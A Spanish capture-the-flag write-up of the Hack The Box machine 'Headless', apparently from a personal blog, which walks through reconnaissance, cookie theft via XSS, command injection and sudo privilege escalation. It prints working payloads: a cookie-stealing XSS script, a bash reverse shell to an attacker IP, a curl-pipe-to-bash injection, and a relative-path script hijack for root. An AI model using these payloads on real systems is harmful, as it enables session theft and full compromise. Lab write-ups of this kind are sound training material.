---
title: "Headless - HTB Writeup"
layout: single
excerpt: "Headless es una maquina fácil de Hack The Box. Para el acceso inicial robaremos una cookie de administrador gracias a un XSS DOM expuesto que nos permitirá acceder a un dashboard el cual tendrá un RCE a través de su envió de formulario de fechas. Una vez tengamos acceso a la máquina, con una enumeración sencilla al sudo podremos escalar privilegios gracias a un script que se ejecuta sin necesidad de proveer contraseña el cual ejecuta un archivo en el directorio actual de trabajo del cual nos aprovecharemos para obtener root."
show_date: true
classes: wide

toc: true
toc_label: "Contenido"
toc_icon: "cube"
toc_sticky: false


header:
  teaser: https://raw.githubusercontent.com/Gr4ykt/gr4ykt.github.io/master/assets/images/Headless-HackTheBox/Headless-htb-logo.png
  teaser_home_page: true
  icon: https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/2e9afb33-966a-4848-af53-9473877d2350

categories:
  - Writeup
  - Hack The Box
tags:
  - XSS
  - Fuzzing
  - RCE
  - CVE
  - Linux
  - Enumeration
  - Cookie Hijacking
---

![Headless-header](https://raw.githubusercontent.com/Gr4ykt/gr4ykt.github.io/master/assets/images/Headless-HackTheBox/Headless-header.png)

# Reconocimiento
## Sistema operativo de la máquina
Lo primero sería entender bien con qué tipo de máquina estamos tratando recordar que según el TTL, el tiempo en el cual se almacenan los datos cache en servidor o máquina, en este caso dará un *ttl de 63*, debido a que es una máquina Linux, pero esta posee un intermediario y por ello se ve reducido el tiempo de respuesta.

| Sistema operativo | TTL |
| ----------------- | --- |
| Linux             | 64  |
| Windows           | 128 |

```bash
ping -c 1 10.10.11.8
```

![Pasted image 20240615213314](https://github.com/user-attachments/assets/17c55888-22f6-4c1b-9eda-f2e2e180d628)

# Escaneo y enumeración
## Nmap

```bash
nmap -sS --min-rate 5000 -p- -Pn -n -vvv 10.10.11.8 -oN 1
```

>Parámetros utilizados: 
>* **-sS:** Syn Scan o Stealth Scan, No completa la conexión hacia la máquina, pero de igual modo emite un paquete que descubre si el puerto está abierto o no..
>* **--min-rate 5000:** Decimos que no emita paquetes mas grandes que 5000.
>* **-p-**: Escaneo enfocado en los 65535 puertos.
>* **-Pn:** Evitar realizar rastreo de la version del sistema operativo remoto.
>* **-n:** Evitar la resolución DNS, simplemente para que el escaneo vaya un poco mas rápido.
>* **-vvv:** Triple *verbose* para tener mayor información al momento mientras se realiza el escaneo.
>* **-oN 1:** Almacena los resultados en un archivo llamado `1` en el formato nmap correspondiente, lo cual significa que este archivo entregara la información tal cual se nos fue expuesta durante y al finalizar el escaneo.

![Pasted image 20240615213959](https://github.com/user-attachments/assets/f5659bcf-2ef6-408a-b534-d7d04408a113)

Pues bien, el escaneo nos entrega dos puertos expuestos, en este caso `22 y 5000`, correspondiendo a los servicios `SSH y UPnP`. Al no tener mayor información lo mejor siempre es recurrir a `nmap` a través de un escaneo tipo `-sCV` el cual evaluara las versiones, enumerara en lo que pueda y nos entregara información un tanto más relevante sobre lo que existe detrás de estos puertos.

```bash
nmap -sCV -p22,5000 10.10.11.8 -oN version_control
```

>Parámetros utilizados: 
>* **-sCV:** Este comando es la combinación de dos, pese a ir a algo similar, ya que ambos hacen referencia a escanear las versiones y servicios que corren en el puerto, `-sC` es un comando enfocado en lanzar una serie de scripts de nmap a través de los propios scripts de la herramienta (NSE), su objetivo es la búsqueda de versiones, identificar vulnerabilidades, entre otras pruebas útiles. Mientras que `-sV` realiza una detección de servicios y versiones exactas en el puerto especificado.
>* **-p22,5000:** Señalamos los puertos a los que realizar el escaneo, en este caso solo son los dos puertos abiertos, en caso de no hacerlo con este parámetro, nmap realizara el escaneo en su top predeterminado de puertos, ya que nmap por detrás, si no se le señalan los puertos específicos, no realiza el escaneo en los 65535 puertos existentes, para ello se utiliza el parámetro `-p-`.
>* **-oN:** Guardará el archivo con nombre `version_control` en el formato nmap, por tanto, conservara el formato sacado en el escaneo.

![Pasted image 20240615215055](https://github.com/user-attachments/assets/d6081d7c-7213-46bb-af32-e50aed6e4cf0)

## Escaneando la web
### Whatweb
Pues si bien con la información recopilada ya tenemos conocimientos más o menos a que es lo que nos estamos enfrentando, en este caso, supone un servicio `Wekezeug 2.2`, una versión de esta biblioteca de utilidades de WSGI (*Web Server Gateway Interface*) ya conocida por su [debug shell](https://www.exploit-db.com/exploits/43905), la cual adelanto, es una resolución similar, pero no igual, ya que en este caso deberemos de abordarla a través de peticiones en `BurpSuite`. Pero me estoy yendo por las ramas, la idea en este punto sería empezar a explorar la web misma, puesto que el resultado tanto en el uso de `nmap` como de `whatweb` fue exitoso y nos dio una pista de como abordar el problema.

![Pasted image 20240615215631](https://github.com/user-attachments/assets/66d3ba4f-119b-49f9-b0f5-f7447647fedc)

### Explorando el puerto `5000`
Pues bien, una vez ingresamos, solo podemos visualizar un contador y no mucha más información, en este punto, todavía nos queda una manera de explorar un poco más el sitio y esta manera es a través de **fuzzing**. La idea sería explorar directorios los cuales contiene el servicio y ver si hay alguna información relevante.

![Pasted image 20240616214442](https://github.com/user-attachments/assets/92430e5c-e1ac-482b-904b-f7c6a845e32d)

Pues bien, el resultado esta vez amerita algo interesante, ya que tenemos un `dashboard` el cual no tenemos acceso, nos arroja un código `500`, por tanto, está arrojando algún tipo de error. El otro directorio detectado es `support`, al cual tenemos acceso, por tanto, podríamos explorar y ver qué opciones nos va entregando nuestra auditoria.

```bash
gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 25
```

>Parámetros utilizados: 
> * **dir:** Le decimos al programa que es una búsqueda por directorios.
> * **-u:** La url a la cual fuzzearemos los directorios.
> * **-w:** El diccionario a utilizar, el recomendable para fuzzera directorios medios o de inicio es el `directory-list-2.3-medium`.

![Pasted image 20240616215523](https://github.com/user-attachments/assets/355dcfd6-7078-45ad-bd29-f0c4bdaa324d)

# Explotación
Pues bien, no tenemos acceso al `dashboard`, por ello, debemos de explorar otras opciones, podemos empezar por el `support` porque tenemos acceso a este y podemos ver que podemos hacer. Pues, de primeras vemos lo siguiente:

![Pasted image 20240616215930](https://github.com/user-attachments/assets/c5b92501-d7e9-4805-a620-b9d96af1e5eb)
![Pasted image 20240616220257](https://github.com/user-attachments/assets/882dffe9-0789-472b-8e7f-dbf548f05142)

A este sitio, le traté de arrojar un **XSS**, caso que nos entrega el mensaje de la imagen adjunta, en este caso, como podemos ver, los está detectando de manera directa el intento de intrusión, habrá que improvisar.

![Pasted image 20240616220411](https://github.com/user-attachments/assets/11e6175a-594f-4b2f-b29e-1c78b64a6779)

Aquí lo que podemos hacer es tratar de realizar bypass a través de `BurpSuite`, para que podamos capturar los campos recuperados.

## XSS y Cookie Hijacking
Primero que nada **¿Qué es el cookie hijacking?** Cookie hijacking o secuestro de sesión es un tipo de ataque informático que consiste en el robo de la cookie de un usuario para acceder a directorios del sitio no autorizados. En este caso como prueba de concepto utilizaremos el caso de la máquina, la idea seria con un `XSS` robar la cookie de sesión del administrador, y de ahí, proceder a la suplantación de cookie en el `dashboard` con una herramienta llamada `edithiscookie`, teniendo así acceso al `dashboard`.

Pues bien, comenzando con `BurpSuite`, deberíamos de poder capturar la petición del panel `support` y de ahí enviar al `repeater` y tratar de enviarnos la cookie al servidor `http.server` previamente encendido. Pues bien, lo primero en este punto seria iniciar nuestro servidor para poder recibir la solicitud a lanzar a través del repeater de `BurpSuite`. Recordar previamente a lanzar el ataque, recoger una solicitud con la herramienta de `BurpSuite` para prontamente enviarla al `repeater` de esta misma, para poder jugar con la solicitud y realizar las comprobaciones necesarias que estime conveniente.

```bash
python -m http.server
```

Pues ya en este punto quedaría tratar de ejecutar el ataque, en este caso, la solicitud respondió de manera correcta inyectando el código JavaScript en el `user-agent`.

> ¿Qué es el `user-agent`?
> * Es una cadena de texto enviada en las solicitudes HTTP que identifica al cliente que realiza la petición, esta información incluye el tipo de dispositivo, sistema operativos, versiones de software.

```html
<script>document.location="http://10.10.14.11:8000/xss-76.js?c="+document.cookie;</script>
```

![Pasted image 20240616224051](https://github.com/user-attachments/assets/61b1a126-6dab-42e7-abf2-c13f02393153)
![Pasted image 20240616224302](https://github.com/user-attachments/assets/47a12232-153b-482a-83f1-15510c503e29)

Ya aquí, lo que queda es utilizando la herramienta `edithiscookie` editar la cookie estando en el directorio `dashboard` del sitio.

![Pasted image 20240616224511](https://github.com/user-attachments/assets/32fc4330-44f5-4c9c-b659-0faae7b7cdde)
![Pasted image 20240616224541](https://github.com/user-attachments/assets/94785f05-dccc-496e-975c-2e569aa99527)

Ahora solo quedaría tratar de escalar en este punto a ejecución remota de comandos.

## RCE to Shell
Una vez hemos accedido a la máquina, toca explorar y trastear con lo que tenemos en este punto, ya que del gran avance que hemos tenido en este reto, por primera vez nos encontramos una parte interactiva, lo cual puede ser un indicativo del buen camino que hemos tomado hasta ahora. Pues lo primero que se nos presenta es un *dashboard administrativo*, con un botón que tiene el texto `generate report`, pues esto puede llegar a ser descriptivo, podemos darle clic y ver que ocurre.

![Pasted image 20240616224843](https://github.com/user-attachments/assets/ac458a0e-8526-45d7-88e6-a71b514a08d9)

Pues bien, esto es bastante interesante, podríamos enviar esta solicitud al repeater, ver que es lo que está realizando la solicitud por detrás.

![Pasted image 20240616225110](https://github.com/user-attachments/assets/947bf775-7a21-4621-a940-9a598b4759c8)
![Pasted image 20240616225223](https://github.com/user-attachments/assets/e4c410d2-5ef9-4b54-bd91-a1d9967993bb)


Wow! Esto ya nos señala que tenemos un **RCE**, asunto bastante peligroso, pues ahora quedaría tratar de entablarnos una reverse shell, y luego continuar con la parte final de esta máquina.

Primero lo primero, será crear un archivo `rev.sh` en este caso le he puesto ese nombre y contiene lo siguiente:

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.11/5757 0>&1"
```

Luego de crear el archivo, inicie un servidor `http` como lo hicimos anteriormente, ya que a través del comando `curl` ejecutaremos nuestra reverse shell y obtener acceso a la máquina.

```bash
python -m http.server
```

![Pasted image 20240616225719](https://github.com/user-attachments/assets/b33cb1db-5dbd-401a-97d8-2de93c0653c9)

Nos ponemos en escucha del siguiente modo `nc -lnvp 5757`.

![Pasted image 20240616225806](https://github.com/user-attachments/assets/01d5f8a6-5639-4781-8dc8-289afb24d983)

Y ejecutamos el ataque en burpsuite agregando la siguiente línea y enviando la petición:

```bash
;curl+http://IP:PORT/rev.sh|bash
```

![Pasted image 20240616225914](https://github.com/user-attachments/assets/a14d151d-5213-406f-a7e6-f863a72c6482)
![Pasted image 20240616225934](https://github.com/user-attachments/assets/7e595d83-e781-406a-96b0-532a8aa79c37)

Listo, estamos dentro de la máquina, lo que nos quedaría ahora, sería escalar privilegios, como ya tenemos acceso como un usuario, el usuario `dvir`, solo será necesario obtener el usuario `root`.

### Tratamiento de la TTY
Ahora nos queda nada más hacerle un tratamiento a la TTY y podemos seguir avanzando en la búsqueda de resolver esta máquina.

```bash
script /dev/null -c bash
ctrl^z
	stty raw -echo; fg
		xterm
		export TERM=xterm
```

# Escalación de privilegios
Siempre que iniciamos una escalada de privilegios hay puntos claves a observar, en este caso, al escribir un `sudo -l` basto para encontrar algo interesante de lo cual aprovecharnos, recordar siempre que existen formas automatizadas de analizarlo y es a través de la herramienta linepas la cual nos recopila la información podemos realizar una recopilación de información automatizada, aunque siempre es bueno practicar el cómo podemos enumerar un sistema.

![Pasted image 20240616230508](https://github.com/user-attachments/assets/7fadd911-9152-4706-9880-709c6ff6da60)
![Pasted image 20240616230642](https://github.com/user-attachments/assets/aacbaa15-b603-460e-99f6-883410526f72)

Pues bien, el `sudo -l` nos dio un buen resultado, bastante, esto ya nos está dando una pista por donde ir, ya que podemos ejecutar como sudo un archivo `syscheck` sin tener que proporcionar contraseña, por tanto, lo suyo sería analizar el código, puesto que al buscar en GTFobins no llegue a nada en relación a este script, así que tendremos que intentar por tratar de comprender un poco que es lo que está realizando el script.

```bash
#!/usr/bin/bash

if [ "$EUID" -ne 0 ]; then
    exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
    /usr/bin/echo "Database service is not running. Starting it ..."
    ./initdb.sh &>/dev/null
else
    /usr/bin/echo "Database service is running."
fi

exit 0
```

Cabe recalcar que el ejecutar el script tampoco llegue a mucho, solo nos queda la opción de analizar, a lo cual llegue a entender cuatro puntos claves:
1. El script realiza una verificación si el usuario que ejecuta el script es `root`.
2. Muestra la fecha y hora de la última modificación de kernel en `/boot`.
3. Calcula es espacio del disco desde la raíz `/`.
4. Comprueba si el script `initdb.sh` se encuentra en ejecución, en caso de no estarlo, lo ejecuta, pero aquí está el punto importante, ya que **ejecuta el script `initdb.sh` desde la ruta actual en la cual el script `syscheck` es ejecutado**, esto quiere decir que puedo crear mi propio script `initdb.sh` y tratar de ejecutar el script.


Por tanto, queda escribir un script, ejecutar el `syscheck`, y comprobar si esta teoría para escalar privilegios es correcta. Adjunto el `initdb.sh` y la manera utilizada para ejecutarlo.

```bash
#!/bin/bash
/bin/bash
```

```bash
mktemp -d
cd tmp/ruta
nano initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
```

![Pasted image 20240616231226](https://github.com/user-attachments/assets/9d9db426-831e-4f2f-a143-f479c4ea3749)

Y de esta manera estará completada la máquina.

![Pasted image 20240616230604](https://github.com/user-attachments/assets/9bb87783-88d5-4ce0-8826-1e9eae98c67c)
![Pasted image 20240616231317](https://github.com/user-attachments/assets/9ace5e19-f6fc-45ad-b9b8-20018b8fcabe)


[Flag 
